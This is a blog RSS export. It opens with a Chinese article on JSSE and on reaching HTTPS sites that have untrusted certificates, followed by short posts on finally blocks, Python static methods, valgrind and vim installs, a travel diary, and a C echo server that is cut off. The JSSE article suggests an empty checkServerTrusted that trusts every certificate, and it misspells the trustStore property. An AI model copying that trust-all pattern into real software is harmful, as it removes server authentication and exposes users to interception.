本文将在简要介绍JSSE的基础上，详细描述使用JSSE访问HTTPS的方法，主要说明了如何访问带有未经验证证书的HTTPS站点。<BR><BR>　　<STRONG>JSSE简介<BR><BR></STRONG>　　Java安全套接扩展 (Java Secure Socket Extension, JSSE)是实现Internet安全通信的一系列包的集合。它是一个SSL和TLS的纯Java实现，可以透明地提供数据加密、服务器认证、<NOBR style="COLOR: #6600ff; BORDER-BOTTOM: #6600ff 1px dotted; BACKGROUND-COLOR: transparent; TEXT-DECORATION: underline;"  target="_blank"  this kwC false>信息</NOBR>完整性等功能，可以使我们像使用普通的套接字一样使用JSSE建立的安全套接字。JSSE是一个开放的标准，不只是Sun公司才能实现一个JSSE，事实上其他公司有自己实现的JSSE。<BR><BR>　　在深入了解JSSE之前，需要了解一个有关Java安全的概念：客户端的TrustStore文件。客户端的TrustStore文件中保存着被客户端所信任的服务器的证书信息。客户端在进行SSL连接时，JSSE将根据这个文件中的证书决定是否信任服务器端的证书。<BR><BR>　　JSSE中，有一个信任管理器类负责决定是否信任远端的证书，这个类有如下的处理规则：<BR><BR>　　⑴ 果系统属性javax.net.sll.trustStore指定了TrustStore文件，那么信任管理器就去jre安装路径下的lib/security/目录中寻找并使用这个文件来检查证书。<BR><BR>　　⑵ 果该系统属性没有指定TrustStore文件，它就会去jre安装路径下寻找默认的TrustStore文件，这个文件的相对路径为：lib/security/jssecacerts。<BR><BR>　　⑶ 如果 jssecacerts不存在，但是cacerts存在(它随J2SDK一起发行，含有数量有限的可信任的基本证书)，那么这个默认的TrustStore文件就是cacerts。<BR><BR>　　直接使用类HttpsURLConnection访问Web页面</FONT></P>  <P><FONT color="#000000" >Java提供了一种非常简洁的方法来访问HTTPS网页，即使用类HttpsURLConnection、URL等。这几个类为支持HTTPS对JSSE相关类做了进一步的封装，例子如下所示<BR></FONT><NOBR style="COLOR: #6600ff; BORDER-BOTTOM: #6600ff 1px dotted; BACKGROUND-COLOR: transparent; TEXT-DECORATION: underline;"  target="_blank"  this kwC false><FONT color="#000000" ><BR></FONT></NOBR></P>  <TABLE borderColor="#cccccc" width="90%"  align="center" bgColor="#e3e3e3" border="1" >  <TBODY>  <TR>  <TD><FONT color="#000000" >URL reqURL = new URL("https://www.sun.com" ); //创建URL对象<BR>HttpsURLConnection httpsConn = (HttpsURLConnection)reqURL.openConnection();<BR><BR>/*下面这段代码实现向Web页面发送数据，实现与网页的交互访问<BR>httpsConn.setDoOutput(true); <BR>OutputStreamWriter out = new OutputStreamWriter(huc.getOutputStream(), "8859_1"); <BR>out.write( "……" ); <BR>out.flush(); <BR>out.close();<BR>*/<BR><BR>//取得该连接的输入流，以读取响应内容 <BR>InputStreamReader insr = new InputStreamReader(httpsConn.getInputStream();<BR><BR>//读取服务器的响应内容并显示<BR>int respInt = insr.read();<BR>while( respInt != -1){<BR>　System.out.print((char)respInt);<BR>　respInt = insr.read();<BR>} </FONT></TD></TR></TABLE>  <P><BR><FONT color="#000000" >　　这段代码能够正常执行，然而把访问的URL改为</FONT><A rel="nofollow" href="https://login.bjut.edu.cn/"  ><FONT color="#000000" >https://login.bjut.edu.cn</FONT></A><FONT color="#000000" >时，</FONT><NOBR style="COLOR: #6600ff; BORDER-BOTTOM: #6600ff 1px dotted; BACKGROUND-COLOR: transparent; TEXT-DECORATION: underline;"  target="_blank"  this kwC false><FONT color="#000000" >程序</FONT></NOBR>将抛出异常javax.net.ssl.SSLException，这是由于https://login.bjut.edu.cn站点的安全证书不被JSSE所信任。根据JSSE简介中对信任管理器的分析，一种解决这个问题的方法是按照信任管理器的处理规则，把站点的证书放到证书库文件jssecacerts中，或者把证书存放到任一TrustStore文件中，然后设置系统属性javax.net.sll.trustStore指向该文件。另一种解决方法则是自己实现信任管理器类，让它信任我们指定的证书。下面分别介绍这两种方法。<BR><BR>　　<B>将证书导入到TrustStore文件中</B><BR><BR>　　Java提供了命令行工具keytool用于创建证书或者把证书从其它文件中导入到Java自己的TrustStore文件中。把证书从其它文件导入到TrustStore文件中的命令行格式为：<BR><BR>　　keytool -import -file src_cer_file –keystore dest_cer_store<BR><BR>　　其中，src_cer_file为存有证书信息的源文件名，dest_cer_store为目标TrustStore文件。<BR><BR>　　在使用keytool之前，首先要取得源证书文件，这个源文件可使用IE浏览器获得，IE浏览器会把访问过的HTTPS站点的证书保存到本地。从IE浏览器导出证书的方法是打开“Internet 选项”，选择“内容”选项卡，点击“证书…”按钮，在打开的证书对话框中，选中一个证书，然后点击“导出…”按钮，按提示一步步将该证书保存到一文件中。最后就可利用keytool把该证书导入到Java的TrustStore文件中。为了能使Java程序找到该文件，应该把这个文件复制到jre安装路径下的lib/security/目录中。<BR><BR>　　这样，只需在程序中设置系统属性javax.net.sll.trustStore指向文件dest_cer_store，就能使JSSE信任该证书，从而使程序可以访问使用未经验证的证书的HTTPS站点。<BR><BR>　　使用这种方法，编程非常简单，但需要手工导出服务器的证书。当服务器证书经常变化时，就需要经常进行手工导出证书的操作。下面介绍的实现X509证书信任管理器类的方法将避免手工导出证书的问题。<BR></P>  <P style="TEXT-INDENT: 2em;"  >X509证书信任管理器类的实现及应用</P>  <P style="TEXT-INDENT: 2em;"  >　　在JSSE中，证书信任管理器类就是实现了接口X509TrustManager的类。我们可以自己实现该接口，让它信任我们指定的证书。</P>  <P style="TEXT-INDENT: 2em;"  >　　接口X509TrustManager有下述三个公有的方法需要我们实现：</P>  <P style="TEXT-INDENT: 2em;"  >　　⑴ oid checkClientTrusted(X509Certificate[] chain, String authType) </P>  <P style="TEXT-INDENT: 2em;"  >throws CertificateException</P>  <P style="TEXT-INDENT: 2em;"  >　　该方法检查客户端的证书，若不信任该证书则抛出异常。由于我们不需要对客户端进行认证，因此我们只需要执行默认的信任管理器的这个方法。JSSE中，默认的信任管理器类为TrustManager。</P>  <P style="TEXT-INDENT: 2em;"  >　　⑵ oid checkServerTrusted(X509Certificate[] chain, String authType) </P>  <P style="TEXT-INDENT: 2em;"  >throws CertificateException </P>  <P style="TEXT-INDENT: 2em;"  >　　该方法检查服务器的证书，若不信任该证书同样抛出异常。通过自己实现该方法，可以使之信任我们指定的任何证书。在实现该方法时，也可以简单的不做任何处理，即一个空的函数体，由于不会抛出异常，它就会信任任何证书。</P>  <P style="TEXT-INDENT: 2em;"  >　　⑶ X509Certificate[] getAcceptedIssuers() </P>  <P style="TEXT-INDENT: 2em;"  >　　返回受信任的X509证书数组。</P>  <P style="TEXT-INDENT: 2em;"  >　　自己实现了信任管理器类，如何使用呢？类HttpsURLConnection似乎并没有提供方法设置信任管理器。其实，HttpsURLConnection通过SSLSocket来建立与HTTPS的安全连接，SSLSocket对象是由SSLSocketFactory生成的。HttpsURLConnection提供了方法setSSLSocketFactory(SSLSocketFactory)设置它使用的SSLSocketFactory对象。SSLSocketFactory通过SSLContext对象来获得，在初始化SSLContext对象时，可指定信任管理器对象。下面用一个图简单表示这几个JSSE类的关系： </P>  <P style="TEXT-INDENT: 2em;"  >  <TABLE width="90%"  align="center" border="0" >  <TBODY>  <TR>  <TD>  <P></P>  <P style="TEXT-INDENT: 2em;"  ><IMG title="JSSE访问带有未验证证书的HTTPS[转] - hankjin - 云水居"  alt="JSSE访问带有未验证证书的HTTPS[转] - hankjin - 云水居"  src="http://dev.yesky.com/imagelist/06/04/d9fe68331950.gif"  border="0" ></P>  <P style="TEXT-INDENT: 2em;"  >图1 部分JSSE类的关系图</P>  <P style="TEXT-INDENT: 2em;"  ></P></TD></TR></TABLE></P>  <P style="TEXT-INDENT: 2em;"  >　　假设自己实现的X509TrustManager类的类名为：MyX509TrustManager，下面的代码片断说明了如何使用MyX509TrustManager：</P>  <P style="TEXT-INDENT: 2em;"  >  <TABLE borderColor="#cccccc" width="90%"  align="center" bgColor="#e3e3e3" border="1" >  <TBODY>  <TR>  <TD>//创建SSLContext对象，并使用我们指定的信任管理器初始化   <P></P>  <P style="TEXT-INDENT: 2em;"  >TrustManager[] tm = {new MyX509TrustManager ()}; </P>  <P style="TEXT-INDENT: 2em;"  >SSLContext sslContext = SSLContext.getInstance("SSL","SunJSSE"); </P>  <P style="TEXT-INDENT: 2em;"  >sslContext.init(null, tm, new java.security.SecureRandom()); </P>  <P style="TEXT-INDENT: 2em;"  >//从上述SSLContext对象中得到SSLSocketFactory对象</P>  <P style="TEXT-INDENT: 2em;"  >SSLSocketFactory ssf = sslContext.getSocketFactory();</P>  <P style="TEXT-INDENT: 2em;"  >//创建HttpsURLConnection对象，并设置其SSLSocketFactory对象</P>  <P style="TEXT-INDENT: 2em;"  >HttpsURLConnection httpsConn = (HttpsURLConnection)myURL.openConnection();</P>  <P style="TEXT-INDENT: 2em;"  >httpsConn.setSSLSocketFactory(ssf); </P></TD></TR></TABLE></P>  <P style="TEXT-INDENT: 2em;"  >　　这样，HttpsURLConnection对象就可以正常连接HTTPS了，无论其证书是否经权威机构的验证，只要实现了接口X509TrustManager的类MyX509TrustManager信任该证书。</P>  <P style="TEXT-INDENT: 2em;"  >　　小结</P>  <P style="TEXT-INDENT: 2em;"  >　　本文主要介绍了在HTTPS的证书未经权威机构认证的情况下，访问HTTPS站点的两种方法，一种方法是把该证书导入到Java的TrustStore文件中，另一种是自己实现并覆盖JSSE缺省的证书信任管理器类。两种方法各有优缺点，第一种方法不会影响JSSE的安全性，但需要手工导入证书；第二种方法虽然不用手工导入证书，但需要小心使用，否则会带来一些安全隐患。 </P>  <P style="TEXT-INDENT: 2em;"  ></P>  <P>&nbsp;</P>  <P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007101733117197/</guid>
    </item>
    <item>
      <title>
<![CDATA[C#,Java,C++中的finally关键字]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201031511305338/</link>
      <description>
<![CDATA[先说C++，标准C++不支持finally, 如果要实现finally的效果，可以用析构函数来实现：<br><span style="font-style: italic;">class File_handle {</span><br style="font-style: italic;"><span style="font-style: italic;">
&nbsp;&nbsp; FILE* p;</span><br style="font-style: italic;"><span style="font-style: italic;">
 public:</span><br style="font-style: italic;"><span style="font-style: italic;">
&nbsp;&nbsp; File_handle(const char* n, const char* a)</span><br style="font-style: italic;"><span style="font-style: italic;">
&nbsp;&nbsp;&nbsp; { p = fopen(n,a); if (p==0) throw Open_error(errno); }</span><br style="font-style: italic;"><span style="font-style: italic;">
&nbsp;&nbsp; File_handle(FILE* pp)</span><br style="font-style: italic;"><span style="font-style: italic;">
&nbsp;&nbsp;&nbsp; { p = pp; if (p==0) throw Open_error(errno); }</span>
<p style="font-style: italic;">&nbsp;&nbsp; ~File_handle() { fclose(p); }</p>
<p style="font-style: italic;">&nbsp;&nbsp; operator FILE*() { return p; }</p>
<p style="font-style: italic;">&nbsp;&nbsp; // ...<br>
 };</p><br>C#和Java基本一致<br>以C#为例<br>无论是否有异常，理论上finially都会在最后被调用，实际上，要确保在执行到finally之前没有Exit<br><span style="font-weight: bold;">正常流程</span>：注释掉2，运行流程为1-》3-》8-》7<br><span style="font-weight: bold;">异常流程</span>：注释掉3和5，运行流程为1-》2-》4-》6-》8-》7<br><span style="font-weight: bold;">退出流程</span>：注释掉3，运行流程为1-》2-》4-》5，注意这里finally没有被调用<br><span style="text-decoration: underline;">C#代码</span><br><span style="font-style: italic;">namespace CXX</span><br style="font-style: italic;"><span style="font-style: italic;">{</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; class TestX</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; {</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public TestX()</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine("TestX constructor");//8</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; class Program</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; {</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static TestX f()</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine("Enter F");//1</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw new Exception("Tester");//2</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return new TestX();//3</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch (Exception)</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine("Except caught");//4</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.Environment.Exit(0);//5</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return new TestX();//6</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; finally</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine("Finaly");//7</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static void Main(string[] args)</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Program.f();</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">}</span><br><span style="text-decoration: underline;">Java代码：</span><br><span style="font-style: italic;">class A{</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; public A(){</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("A construct");//8</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">}</span><br style="font-style: italic;"><span style="font-style: italic;">public class Test{</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; static A f(){</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try{</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("Worked");//1</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw new Exception("Ok");//2</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return new A();//3</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch(Exception e){</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("Except");//4</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.exit(1);//5</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return new A();//6</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; finally{</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("Finaled");//7</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; public static void main(String args[])throws Exception{</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Test.f();</span><br style="font-style: italic;"><span style="font-style: italic;">&nbsp;&nbsp;&nbsp; }</span><br style="font-style: italic;"><span style="font-style: italic;">}</span><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201031511305338/</guid>
    </item>
    <item>
      <title>
<![CDATA[武汉行]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200791674914697/</link>
      <description>
<![CDATA[<P>11号下午16点40从钻石大厦出发，17：46到北京西站T201，18：10开车，</P>
<P>12号上午4：30到汉口，6：00乘536到关山口，7：00到华中，8：30-11：30笔试。下午2：30开始英语面试，每人5分钟，按顺序进行。</P>
<P>13号上午8：30-10：00上机，3道题，第一道很简单，但为了完善花了一个小时，第二题是文件操作的，C的文件操作忘光了，所以直接pass，然后第三题是一个二叉树的，不难，半个小时搞定，编译通过，运行错误，最后发现忘记申请内存了。</P>
<P>14号上午8：30面试，9：00多才开始，每人5分钟，自我介绍，然后一个面试官问：你估计自己离散数学考了多少，我说大概50分吧，然后另一个说满分50，我说那大概25吧。然后那个问我的人说：你考了0分。然后问，为什么考0分，我说全忘光了，当时忘得就剩四个字了，一个面试官就问：哪四个字？另外一个就回答说：离散数学啊。下午3：00出结果，一直等到4：30才出结果，5点拿到证明，签字，6点回武昌车站。买的晚上9点的火车Z38，440元，大出血。晚上一觉睡到北京了。</P>
<P>15号早7点到北京，7：15从北京西站走到军博，7：30乘1号线，7：40转2号线，8：00到西直门，8：30到西二旗，然后班车到公司。</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200791674914697/</guid>
    </item>
    <item>
      <title>
<![CDATA[python的静态方法]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720099315272211/</link>
      <description>
<![CDATA[class A:<br>&nbsp;&nbsp;&nbsp; @staticmethod<br>&nbsp;&nbsp;&nbsp; def f(name):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print name<br>&nbsp;&nbsp;&nbsp; @classmethod<br>&nbsp;&nbsp;&nbsp; def f2(cls):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print cls<br><br>A.f('hank') #静态方法<br>A.f2()#类方法<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720099315272211/</guid>
    </item>
    <item>
      <title>
<![CDATA[朝闻道，夕死可矣]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720116171359556/</link>
      <description>
<![CDATA[<b>Valgrind</b><br>1. 安装<br>wget http://valgrind.org/downloads/valgrind-3.6.1.tar.bz2<br>bzip2 -d valgrind-3.6.1.tar.bz2<br>tar xf valgrind-3.6.1.tar<br>cd valgrind-3.6.1<br>./configure;make<br>2. 使用valgrind检查内存泄露<br>valgrind --leak-check=full ./bin/myexe<br>3. 使用valgrind检查内存消耗<br>valgrind --tool=massif ./bin/myexe<br>ms_print massif.out.12345 | less<div>4. 使用callgrind分析性能</div><div>valgrind --tool=callgrind --callgrind-out-file=cg.out ./a.out</div><div>5. 文档： http://valgrind.org/docs/manual/manual.html<br><br><b>Vim</b><br>1.安装<br>wget ftp://ftp.vim.org/pub/vim/unix/vim-7.3.tar.bz2<br>bzip2 -d vim-7.3.tar.bz2<br>tar xf vim-7.3.tar<br>cd vim-7.3/src<br>#安装到本地目录<br>sed -i 's/#prefix = $(HOME)/prefix = $(HOME)/g' Makefile<br>make;make install<br></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720116171359556/</guid>
    </item>
    <item>
      <title>
<![CDATA[Linux Socket编程 echo server]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720093884615122/</link>
      <description>
<![CDATA[socket-&gt;bind-&gt;listen-&gt;accept-&gt;send-&gt;close<br>C#的接口用起来都很顺手, 因为和Java的语法很像, 唯有Socket这一块不太习惯, 原来如此:<br>#include &lt;stdlib.h&gt;<br>#include &lt;errno.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;sys/wait.h&gt;<br><br>#define MYPORT 4000<br>#define BACKLOG 10<br><br>int main(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sockfd, new_fd;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in my_addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in their_addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sin_size;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((sockfd=socket(AF_INET, SOCK_STREAM, 0))== -1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("socket");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; my_addr.sin_family=AF_INET;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; my_addr.sin_port=htons(MYPORT);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; my_addr.sin_addr.s_addr=INADDR_ANY;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bzero(&amp;(my_addr.sin_zero),8);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(bind(sockfd, (struct sockaddr *)&amp;my_addr, sizeof(struct sockaddr))==-1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("bind");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(listen(sockfd, BACKLOG)==-1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("Listen");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sin_size=sizeof(struct sockaddr_in);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((new_fd=accept(sockfd, (struct sockaddr *)&amp;their_addr,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;sin_size))==-1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("accept");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 